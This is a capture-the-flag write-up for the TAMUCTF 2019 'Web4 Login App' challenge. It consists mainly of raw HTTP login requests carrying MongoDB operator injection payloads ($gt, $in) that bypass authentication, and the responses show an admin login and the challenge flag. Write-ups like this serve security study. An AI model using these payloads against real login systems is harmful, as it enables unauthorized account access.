---
title: "Web4 Login App - TAMUCTF 2019"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "mongodb", "nginx", "web4", "login", "app"]
summary: "web writeup for \"Web4 Login App\" from TAMUCTF - techniques: mongodb, nginx, web4, login, app."
source:
  name: "bl4de/ctf"
  url: "https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2019/TAMUCTF_2019/writeups/Web4_Login_App.md"
ctf:
  name: "TAMUCTF"
  year: 2019
  challenge: "Web4 Login App"
---

## Source

- **CTF:** TAMUCTF 2019
- **Challenge:** Web4 Login App
- **Repository:** [bl4de/ctf](https://github.com/bl4de/ctf)
- **File:** <https://github.com/bl4de/ctf/blob/7e48b1a697a898ac7a1e6856a91041afa529a8be/2019/TAMUCTF_2019/writeups/Web4_Login_App.md>

---
## TAMUCTF 2019 Web


https://docs.mongodb.com/manual/reference/operator/query/gt/


POST /login HTTP/1.1
Host: web4.tamuctf.com
Content-Length: 58
Accept: text/plain
Content-Type: application/json;charset=UTF-8
Referer: http://web4.tamuctf.com/admin
Connection: close

{"username":{"$gt":""},"password":{"$gt":""}}


HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 01 Mar 2019 19:42:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 15
Connection: close
X-Powered-By: Express
ETag: W/"f-19Ag+XhEyRc+UOhG3N8S4DGKLw4"

"Welcome: bob!"



https://docs.mongodb.com/manual/reference/operator/query/in/#op._S_in



POST /login HTTP/1.1
Host: web4.tamuctf.com
Content-Length: 58
Accept: text/plain
Content-Type: application/json;charset=UTF-8
Referer: http://web4.tamuctf.com/admin
Connection: close

{"username":{"$in":["tamuctf", "flag", "admin", "root", "administrator"]},"password":{"$gt":""}}

HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 01 Mar 2019 19:43:08 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 62
Connection: close
X-Powered-By: Express
ETag: W/"3e-PIL9X7plTu9Obxi0Yd4AQFTvkcU"

"Welcome: admin!\ngigem{n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea}"
